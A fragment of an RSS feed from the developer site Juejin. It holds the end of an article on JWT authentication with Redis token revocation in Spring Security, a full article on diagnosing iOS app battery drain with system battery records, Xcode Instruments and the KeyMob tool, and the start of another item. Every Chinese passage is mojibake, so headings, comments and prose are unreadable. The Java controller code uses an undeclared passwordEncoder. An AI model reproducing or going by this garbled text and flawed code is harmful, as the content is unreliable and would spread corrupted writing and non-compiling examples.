        return (String) claims<span class="hljs-selector-class">.get</span>(JwtClaimNames.JTI);
    }
}
</code></pre>
<h4 data-id="heading-8">5. é…ç½® Security</h4>
<p>java</p>
<p>ç¼–è¾‘</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-keyword">@Configuration</span>
<span class="hljs-keyword">@EnableWebSecurity</span>
public class SecurityConfig {

    <span class="hljs-keyword">@Bean</span>
    public JwtAuthenticationFilter jwtAuthenticationFilter() {
        return new <span class="hljs-built_in">JwtAuthenticationFilter</span>();
    }

    <span class="hljs-keyword">@Bean</span>
    public PasswordEncoder passwordEncoder() {
        return new <span class="hljs-built_in">BCryptPasswordEncoder</span>();
    }

    <span class="hljs-keyword">@Bean</span>
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            <span class="hljs-selector-class">.csrf</span>()<span class="hljs-selector-class">.disable</span>()
            <span class="hljs-selector-class">.sessionManagement</span>()<span class="hljs-selector-class">.sessionCreationPolicy</span>(SessionCreationPolicy.STATELESS)
            <span class="hljs-selector-class">.and</span>()
            <span class="hljs-selector-class">.authorizeHttpRequests</span>(authz -&gt; authz
                .requestMatchers("/login", "/public/**")<span class="hljs-selector-class">.permitAll</span>()
                <span class="hljs-selector-class">.anyRequest</span>()<span class="hljs-selector-class">.authenticated</span>()
            )
            <span class="hljs-selector-class">.addFilterBefore</span>(jwtAuthenticationFilter(), UsernamePasswordAuthenticationFilter<span class="hljs-selector-class">.class</span>);

        return http<span class="hljs-selector-class">.build</span>();
    }
}
</code></pre>
<h4 data-id="heading-9">6. ç™»å½•ä¸ç™»å‡ºæ¥å£</h4>
<p>java</p>
<p>ç¼–è¾‘</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@RestController</span>
public class AuthController {

    <span class="hljs-variable">@Autowired</span>
    private UserService userService;

    <span class="hljs-variable">@Autowired</span>
    private JwtUtil jwtUtil;

    <span class="hljs-variable">@Autowired</span>
    private TokenBlacklistService tokenBlacklistService;

    <span class="hljs-variable">@PostMapping</span>(<span class="hljs-string">"/login"</span>)
    public ResponseEntity&lt;?&gt; <span class="hljs-built_in">login</span>(<span class="hljs-variable">@RequestBody</span> LoginRequest req) {
        <span class="hljs-selector-tag">User</span> <span class="hljs-selector-tag">user</span> = <span class="hljs-selector-tag">userService</span><span class="hljs-selector-class">.findByUsername</span>(req.<span class="hljs-built_in">getUsername</span>());
        <span class="hljs-selector-tag">if</span> (user != null &amp;&amp; passwordEncoder.<span class="hljs-built_in">matches</span>(req.<span class="hljs-built_in">getPassword</span>(), user.<span class="hljs-built_in">getPassword</span>())) {
            <span class="hljs-selector-tag">List</span>&lt;<span class="hljs-selector-tag">String</span>&gt; <span class="hljs-selector-tag">roles</span> = <span class="hljs-selector-tag">userService</span><span class="hljs-selector-class">.getUserRoles</span>(user.<span class="hljs-built_in">getId</span>());
            <span class="hljs-selector-tag">String</span> <span class="hljs-selector-tag">token</span> = <span class="hljs-selector-tag">jwtUtil</span><span class="hljs-selector-class">.generateToken</span>(user.<span class="hljs-built_in">getId</span>(), roles);
            <span class="hljs-selector-tag">String</span> <span class="hljs-selector-tag">tokenId</span> = <span class="hljs-selector-tag">extractJtiFromToken</span>(token);

            <span class="hljs-comment">// å­˜å…¥ Redisï¼Œæœ‰æ•ˆæœŸä¸ Token ä¸€è‡´</span>
            <span class="hljs-selector-tag">tokenBlacklistService</span><span class="hljs-selector-class">.saveToken</span>(user.<span class="hljs-built_in">getId</span>(), tokenId, jwtUtil.<span class="hljs-built_in">getExpiration</span>());

            <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">ResponseEntity</span><span class="hljs-selector-class">.ok</span>(Map.<span class="hljs-built_in">of</span>(<span class="hljs-string">"token"</span>, token));
        }
        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">ResponseEntity</span><span class="hljs-selector-class">.status</span>(<span class="hljs-number">401</span>)<span class="hljs-selector-class">.body</span>(<span class="hljs-string">"ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯"</span>);
    }

    @<span class="hljs-selector-tag">PostMapping</span>(<span class="hljs-string">"/logout"</span>)
    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">ResponseEntity</span>&lt;?&gt; <span class="hljs-selector-tag">logout</span>(HttpServletRequest request) {
        <span class="hljs-selector-tag">String</span> <span class="hljs-selector-tag">token</span> = <span class="hljs-selector-tag">extractTokenFromHeader</span>(request);
        <span class="hljs-selector-tag">if</span> (token != null &amp;&amp; jwtUtil.<span class="hljs-built_in">validateToken</span>(token)) {
            <span class="hljs-selector-tag">String</span> <span class="hljs-selector-tag">userId</span> = <span class="hljs-selector-tag">jwtUtil</span><span class="hljs-selector-class">.getUserIdFromToken</span>(token);
            <span class="hljs-selector-tag">tokenBlacklistService</span><span class="hljs-selector-class">.invalidateUserTokens</span>(userId); <span class="hljs-comment">// åˆ é™¤ Redis ä¸­æ‰€æœ‰è¯¥ç”¨æˆ·çš„ Token</span>
        }
        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">ResponseEntity</span><span class="hljs-selector-class">.ok</span>(<span class="hljs-string">"ç™»å‡ºæˆåŠŸ"</span>);
    }

    <span class="hljs-comment">// è¾…åŠ©æ–¹æ³•ç•¥...</span>
}
</code></pre>
<hr/>
<h3 data-id="heading-10">è¸©è¿‡çš„å‘ &amp; å»ºè®®</h3>
<ol>
<li><strong>Redis Key è®¾è®¡</strong>ï¼šå»ºè®®ç”¨Â <code>valid_token:{userId}:{tokenId}</code>ï¼Œæ–¹ä¾¿æŒ‰ç”¨æˆ·æ‰¹é‡æ¸…ç†ã€‚</li>
<li><strong>Token åˆ·æ–°æœºåˆ¶</strong>ï¼šå¯è€ƒè™‘æ»‘åŠ¨è¿‡æœŸï¼ˆæ¯æ¬¡è¯·æ±‚å»¶é•¿ Redis ä¸­ Token çš„ TTLï¼‰ï¼Œä½†è¦æƒè¡¡å®‰å…¨æ€§ã€‚</li>
<li><strong>å¹¶å‘ç™»å‡ºé—®é¢˜</strong>ï¼šç™»å‡ºæ—¶åˆ é™¤ Redis Key æ˜¯åŸå­æ“ä½œï¼Œæ— éœ€æ‹…å¿ƒã€‚</li>
<li><strong>å¯†é’¥ç®¡ç†</strong>ï¼šJWT å¯†é’¥åŠ¡å¿…æ”¾åœ¨é…ç½®ä¸­å¿ƒæˆ–ç¯å¢ƒå˜é‡ï¼Œåˆ«ç¡¬ç¼–ç ï¼</li>
<li><strong>æ€§èƒ½</strong>ï¼šæ¯æ¬¡è¯·æ±‚å¤šä¸€æ¬¡ Redis æŸ¥è¯¢ï¼Œä½† Redis å“åº”é€šå¸¸åœ¨ 1ms å†…ï¼Œå½±å“æå°ã€‚</li>
</ol>
<hr/>
<h3 data-id="heading-11">æ€»ç»“</h3>
<p>è¿™å¥—æ–¹æ¡ˆåœ¨æˆ‘ä»¬ç”Ÿäº§ç¯å¢ƒå·²ç¨³å®šè¿è¡Œä¸‰ä¸ªæœˆï¼Œæ”¯æ’‘æ—¥å‡ç™¾ä¸‡çº§è¯·æ±‚ã€‚å®ƒå…¼é¡¾äº† JWT çš„æ— çŠ¶æ€ä¼˜åŠ¿å’Œ Redis çš„çŠ¶æ€å¯æ§æ€§ï¼Œæ—¢èƒ½æ¨ªå‘æ‰©å±•ï¼Œåˆèƒ½æ»¡è¶³ä¼ä¸šçº§æƒé™ç®¡ç†éœ€æ±‚ã€‚</p>
<p>å¦‚æœä½ è¿˜åœ¨ç”¨ Session åšé›†ç¾¤æƒé™ï¼Œæˆ–è€…è¢«çº¯ JWT çš„â€œæ— æ³•å³æ—¶å¤±æ•ˆâ€å›°æ‰°ï¼Œä¸å¦¨è¯•è¯•è¿™ä¸ªç»„åˆã€‚ä»£ç è™½å¤šï¼Œä½†é€»è¾‘æ¸…æ™°ï¼Œç»´æŠ¤æˆæœ¬å…¶å®æ¯”æƒ³è±¡ä¸­ä½ã€‚</p>
<blockquote>
<p><strong>æºç å·²æ•´ç†ä¸Šä¼  GitHubï¼ˆç§ä¿¡æˆ‘è·å–é“¾æ¥ï¼‰</strong><br/>
<strong>æ¬¢è¿ç•™è¨€è®¨è®ºï¼Œè§‰å¾—æœ‰ç”¨è®°å¾—ç‚¹èµ + å…³æ³¨ï¼</strong></p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[iOS App ç”µè€—ç®¡ç† é€šè¿‡ç³»ç»Ÿç”µæ± è®°å½•ã€Xcode Instruments ä¸å…‹é­”ï¼ˆKeyMobï¼‰ç»„åˆä½¿ç”¨]]></title>    <link>https://juejin.cn/post/7597252004712988714</link>    <guid>https://juejin.cn/post/7597252004712988714</guid>    <pubDate>2026-01-20T09:53:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597252004712988714" data-draft-id="7597252004712972330" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="iOS App ç”µè€—ç®¡ç† é€šè¿‡ç³»ç»Ÿç”µæ± è®°å½•ã€Xcode Instruments ä¸å…‹é­”ï¼ˆKeyMobï¼‰ç»„åˆä½¿ç”¨"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-20T09:53:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æˆ‘æ˜¯è°çš„ç¨‹åºå‘˜"/> <meta itemprop="url" content="https://juejin.cn/user/2390811467846089"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            iOS App ç”µè€—ç®¡ç† é€šè¿‡ç³»ç»Ÿç”µæ± è®°å½•ã€Xcode Instruments ä¸å…‹é­”ï¼ˆKeyMobï¼‰ç»„åˆä½¿ç”¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2390811467846089/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æˆ‘æ˜¯è°çš„ç¨‹åºå‘˜
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T09:53:41.000Z" title="Tue Jan 20 2026 09:53:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨å®é™…é¡¹ç›®é‡Œï¼Œè¿™ä¸ªç‰ˆæœ¬æœ‰ç‚¹è´¹ç”µå¾€å¾€æ˜¯ä¸€ä¸ªå¾ˆæ¨¡ç³Šçš„åé¦ˆã€‚
æµ‹è¯•åŒäº‹è§‰å¾—å‘çƒ­ï¼Œäº§å“æ„Ÿè§‰ç»­èˆªä¸‹é™ï¼Œä½†çœŸæ­£è½åˆ°å·¥ç¨‹å±‚é¢ï¼Œç»å¸¸å¡åœ¨ä¸€ä¸ªç‚¹ä¸Šï¼š<strong>è€—ç”µè¡Œä¸ºå‘ç”Ÿåœ¨ä»€ä¹ˆåœºæ™¯ã€ç”±è°è§¦å‘ã€æŒç»­äº†å¤šä¹…</strong>ã€‚</p>
<p>ç”µè€—ç®¡ç†ä¸æ˜¯å•ä¸€å·¥å…·èƒ½è§£å†³çš„äº‹ï¼Œå®ƒæ›´åƒæ˜¯ä¸€ä¸ªç»„åˆè¿‡ç¨‹ã€‚ä¸‹é¢æˆ‘ç»“åˆä¸€æ¬¡æ¯”è¾ƒå®Œæ•´çš„ iOS App ç”µè€—åˆ†æè¿‡ç¨‹ï¼Œè¯´è¯´æˆ‘æ˜¯å¦‚ä½•æŠŠç³»ç»Ÿå·¥å…·å’Œç¬¬ä¸‰æ–¹å·¥å…·ä¸€èµ·ç”¨èµ·æ¥çš„ã€‚</p>
<hr/>
<h2 data-id="heading-0">å…ˆç¡®è®¤ï¼šç³»ç»Ÿçœ¼é‡Œçš„è€—ç”µåˆ°åº•æ˜¯è°</h2>
<p>åœ¨åŠ¨ä»»ä½•æµ‹è¯•å·¥å…·ä¹‹å‰ï¼Œæˆ‘é€šå¸¸ä¼šå…ˆçœ‹ç³»ç»Ÿå±‚é¢çš„åˆ¤æ–­ã€‚</p>
<h3 data-id="heading-1">ç³»ç»Ÿç”µæ± ä½¿ç”¨è®°å½•çš„ä½œç”¨</h3>
<p>iOS è‡ªå¸¦çš„ã€è®¾ç½® â†’ ç”µæ± ã€‘å…¶å®éå¸¸æœ‰ä»·å€¼ï¼Œå®ƒèƒ½å›ç­”ä¸¤ä¸ªåŸºç¡€é—®é¢˜ï¼š</p>
<ul>
<li>è¿™æ®µæ—¶é—´ä¸»è¦è€—ç”µçš„æ˜¯ä¸æ˜¯è¿™ä¸ª App</li>
<li>è€—ç”µå‘ç”Ÿåœ¨å‰å°ï¼Œè¿˜æ˜¯åå°</li>
</ul>
<p>è¿™ä¸€æ­¥ä¸èƒ½ç²¾ç¡®åˆ°å‡½æ•°çº§åˆ«ï¼Œä½†å®ƒèƒ½å¸®ä½ é¿å…ä¸€ä¸ªå¸¸è§è¯¯åˆ¤ï¼š
<strong>å…¶å®æ˜¯åå°ä»»åŠ¡æˆ–æ¨é€å¯¼è‡´çš„è€—ç”µï¼Œå´è¢«è¯¯ä»¥ä¸ºæ˜¯æŸä¸ªé¡µé¢æ€§èƒ½é—®é¢˜ã€‚</strong></p>
<p>å¦‚æœç³»ç»Ÿè®°å½•æ˜¾ç¤ºè€—ç”µä¸»è¦é›†ä¸­åœ¨å‰å°ä½¿ç”¨é˜¶æ®µï¼Œæ‰å€¼å¾—ç»§ç»­å¾€ä¸‹æ‹†ã€‚</p>
<hr/>
<h2 data-id="heading-2">åœºæ™¯å¤ç°ï¼Œæ¯”è·‘ä¸€æ¬¡æµ‹è¯•é‡è¦å¾—å¤š</h2>
<p>ç”µè€—é—®é¢˜é«˜åº¦ä¾èµ–ä½¿ç”¨è·¯å¾„ã€‚
åŒä¸€ä¸ª Appï¼Œåˆ·åˆ—è¡¨å’Œæ’­æ”¾è§†é¢‘çš„è€—ç”µæ›²çº¿å®Œå…¨ä¸åŒã€‚</p>
<p>æˆ‘ä¸€èˆ¬ä¼šåšä¸¤ä»¶äº‹ï¼š</p>
<ul>
<li>å›ºå®šæµ‹è¯•åœºæ™¯ï¼ˆä¾‹å¦‚è¿ç»­æ»šåŠ¨åˆ—è¡¨ 5 åˆ†é’Ÿï¼‰</li>
<li>å›ºå®šæµ‹è¯•ç¯å¢ƒï¼ˆäº®åº¦ã€ç½‘ç»œã€è®¾å¤‡å‹å·ï¼‰</li>
</ul>
<p>è¿™æ ·åé¢çš„æ•°æ®æ‰æœ‰å¯æ¯”æ€§ã€‚</p>
<hr/>
<h2 data-id="heading-3">ç”¨ Xcode Instruments çœ‹ï¼Œä½†åˆ«ä¸€ä¸Šæ¥å°±é™·è¿›å»</h2>
<p>Instruments çš„ Energy Log éå¸¸å¼ºï¼Œä½†ä¹Ÿéå¸¸å®¹æ˜“è®©äººè¿·å¤±åœ¨æŒ‡æ ‡é‡Œã€‚</p>
<p>æˆ‘è‡ªå·±çš„ä¹ æƒ¯æ˜¯ï¼š</p>
<ul>
<li>ä¸åœ¨ç¬¬ä¸€æ¬¡æµ‹è¯•å°±æ‰“å¼€ Instruments</li>
<li>å…ˆç¡®è®¤æœ‰æ²¡æœ‰<strong>æ˜æ˜¾å¼‚å¸¸è¶‹åŠ¿</strong></li>
</ul>
<hr/>
<h2 data-id="heading-4">å…‹é­”åœ¨ç”µè€—ç®¡ç†é‡Œçš„å®é™…ä½œç”¨</h2>
<p>åœ¨è¿›å…¥ Instruments ä¹‹å‰ï¼Œæˆ‘ä¼šå…ˆç”¨ <strong>å…‹é­”ï¼ˆKeyMobï¼‰</strong> åšä¸€è½®è½»é‡ç›‘æ§ï¼Œå®ƒä¸»è¦æ‰¿æ‹…ä¸‰ä¸ªåŠŸèƒ½ç‚¹ï¼Œè€Œä¸æ˜¯â€œå…¨åŠŸèƒ½æ€§èƒ½åˆ†æâ€ã€‚</p>
<h3 data-id="heading-5">å¯Ÿ CPU æ˜¯å¦é•¿æœŸå¼‚å¸¸æ´»è·ƒ</h3>
<p>ç”µè€—å’Œ CPU ä½¿ç”¨é«˜åº¦ç›¸å…³ã€‚
å¦‚æœåœ¨ç”¨æˆ·â€œçœ‹èµ·æ¥ä»€ä¹ˆéƒ½æ²¡åšâ€çš„æƒ…å†µä¸‹ï¼ŒCPU æ›²çº¿æŒç»­æŠ¬é«˜ï¼Œæœ¬èº«å°±å·²ç»æ˜¯ä¸€ä¸ªé—®é¢˜ã€‚</p>
<p><strong>æ€ä¹ˆåšï¼š</strong></p>
<ol>
<li>è¿æ¥è®¾å¤‡ï¼Œæ‰“å¼€å…‹é­”</li>
<li>è¿›å…¥ã€æ€§èƒ½å›¾è¡¨ã€‘</li>
<li>å‹¾é€‰ CPU æŒ‡æ ‡</li>
<li>é€‰æ‹©ç›®æ ‡ App</li>
<li>æŒ‰æ—¢å®šä½¿ç”¨è·¯å¾„æ“ä½œ</li>
</ol>
<p>å¦‚æœ CPU åœ¨é™æ­¢é¡µé¢ä»é¢‘ç¹æ³¢åŠ¨ï¼Œè¿™æ—¶å°±å€¼å¾—è­¦æƒ•åå°ä»»åŠ¡æˆ–å®šæ—¶é€»è¾‘ã€‚
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4925086eec024597a7f44c677b0618be~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oiR5piv6LCB55qE56iL5bqP5ZGY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769507621&amp;x-signature=UgCk47mHx906pVCjbgxfE0nzrqk%3D" alt="æ€§èƒ½å›¾æ ‡" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-6">é…åˆå®æ—¶æ—¥å¿—ï¼Œç¡®è®¤â€œè°åœ¨å·¥ä½œâ€</h3>
<p>å•çœ‹æ›²çº¿åªèƒ½çŸ¥é“â€œæœ‰é—®é¢˜â€ï¼Œä½†ä¸çŸ¥é“â€œæ˜¯è°â€ã€‚</p>
<p>è¿™æ—¶æˆ‘ä¼šåŒæ—¶æ‰“å¼€å…‹é­”çš„å®æ—¶æ—¥å¿—ã€‚</p>
<p><strong>å®é™…æ“ä½œï¼š</strong></p>
<ul>
<li>å·¦ä¾§è¿›å…¥ã€å®æ—¶æ—¥å¿—ã€‘</li>
<li>è®¾ç½®åªçœ‹å½“å‰ App</li>
<li>ä¿ç•™å…³é”®æ¨¡å—çš„æ—¥å¿—è¾“å‡º</li>
</ul>
<p>æœ‰äº›ç”µè€—é—®é¢˜ï¼Œæœ¬è´¨æ˜¯æ— æ„ä¹‰çš„é‡å¤é€»è¾‘ï¼Œæ¯”å¦‚ï¼š</p>
<ul>
<li>å®šæ—¶åˆ·æ–°æ²¡æœ‰æ­£ç¡®åœæ­¢</li>
<li>é¡µé¢é€€å‡ºåçº¿ç¨‹ä»åœ¨è·‘</li>
</ul>
<p>è¿™äº›å¾€å¾€èƒ½ç›´æ¥åœ¨æ—¥å¿—é‡Œçœ‹åˆ°ã€‚
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d8464bf3da2f402d9a118a97258ce211~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oiR5piv6LCB55qE56iL5bqP5ZGY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769507621&amp;x-signature=d%2B6BjnO5d1tPYeVNj%2FCFabIGC08%3D" alt="å®æ—¶æ—¥å¿—" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-7">é•¿æ—¶é—´è¿è¡Œï¼Œæ¯”å³°å€¼æ›´æœ‰ä»·å€¼</h3>
<p>ç”µè€—ç®¡ç†ä¸å¤ªçœ‹ç¬æ—¶å³°å€¼ï¼Œè€Œæ›´å…³æ³¨<strong>æŒç»­æ€§è¡Œä¸º</strong>ã€‚</p>
<p>å…‹é­”çš„æ€§èƒ½å›¾è¡¨åœ¨è¿™é‡Œæœ‰ä¸€ä¸ªå®ç”¨ç‚¹ï¼š
å®ƒå¯ä»¥åœ¨ä¸æ‰“æ–­ç”¨æˆ·æ“ä½œçš„æƒ…å†µä¸‹ï¼ŒæŒç»­è§‚å¯Ÿèµ„æºå˜åŒ–ã€‚</p>
<p>æˆ‘é€šå¸¸ä¼šï¼š</p>
<ul>
<li>è®© App åœ¨ç›®æ ‡é¡µé¢åœç•™ 10â€“20 åˆ†é’Ÿ</li>
<li>è§‚å¯Ÿ CPU æ˜¯å¦é€æ­¥æŠ¬å‡</li>
<li>å¯¹ç…§å®æ—¶æ—¥å¿—ï¼Œçœ‹æ˜¯å¦æœ‰å‘¨æœŸæ€§è¾“å‡º</li>
</ul>
<p>å¦‚æœèµ„æºä½¿ç”¨å‘ˆâ€œé”¯é½¿çŠ¶è§„å¾‹â€ï¼ŒåŸºæœ¬å¯ä»¥åˆ¤æ–­å­˜åœ¨å®šæ—¶æˆ–è½®è¯¢é€»è¾‘ã€‚</p>
<hr/>
<h2 data-id="heading-8">å›åˆ° Instrumentsï¼ŒéªŒè¯å’Œå®šä½</h2>
<p>å½“ä»¥ä¸Šæ­¥éª¤å·²ç»æ˜ç¡®â€œé—®é¢˜å­˜åœ¨â€ï¼Œå†å›åˆ° Instruments çš„ Energy Logï¼Œæ•ˆç‡ä¼šé«˜å¾ˆå¤šã€‚</p>
<p>è¿™æ—¶ä½ å·²ç»çŸ¥é“ï¼š</p>
<ul>
<li>å“ªä¸ªé¡µé¢</li>
<li>å¤§æ¦‚å‘ç”Ÿåœ¨ä»€ä¹ˆæ—¶é—´æ®µ</li>
<li>æ˜¯å¦ä¸ CPU æˆ–åå°ä»»åŠ¡ç›¸å…³</li>
</ul>
<p>å†å»çœ‹ Wakeupsã€Networkã€CPU Activityï¼ŒåŸºæœ¬ä¸ä¼šè¿·è·¯ã€‚</p>
<hr/>
<p>æœ€åä¸€ä¸ªç»éªŒæ˜¯<strong>ç”µè€—ä¼˜åŒ–å¾€å¾€æ˜¯å›å½’é—®é¢˜ï¼Œè€Œä¸æ˜¯ä¸€æ¬¡æ€§é—®é¢˜ã€‚</strong></p>
<p>æ¯æ¬¡åŠŸèƒ½æ”¹åŠ¨åï¼Œæœ€å¥½ç”¨åŒæ ·çš„åœºæ™¯å†è·‘ä¸€éå¯¹æ¯”ï¼š</p>
<ul>
<li>ç³»ç»Ÿç”µæ± è®°å½•</li>
<li>å…‹é­”çš„ CPU æ›²çº¿</li>
<li>å…³é”®æ—¥å¿—æ˜¯å¦å˜åŒ–</li>
</ul>
<p>è¿™æ ·ä½ æ‰èƒ½ç¡®å®šæ˜¯â€œçœŸçš„ä¼˜åŒ–äº†â€ï¼Œè€Œä¸æ˜¯â€œæ„Ÿè§‰å¥½äº†ä¸€ç‚¹â€ã€‚</p>
<p>å‚è€ƒé“¾æ¥ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fkeymob.com%2Ftutorial%2Fzh%2F1%2F1.html" target="_blank" title="https://keymob.com/tutorial/zh/1/1.html" ref="nofollow noopener noreferrer">keymob.com/tutorial/zhâ€¦</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[PHPå¼€å‘è€…è®­ç»ƒè¥ ä»å…¥é—¨åˆ°ç²¾é€š]]></title>    <link>https://juejin.cn/post/7597243334176555048</link>    <guid>https://juejin.cn/post/7597243334176555048</guid>    <pubDate>2026-01-20T09:37:58.000Z</pubDate>   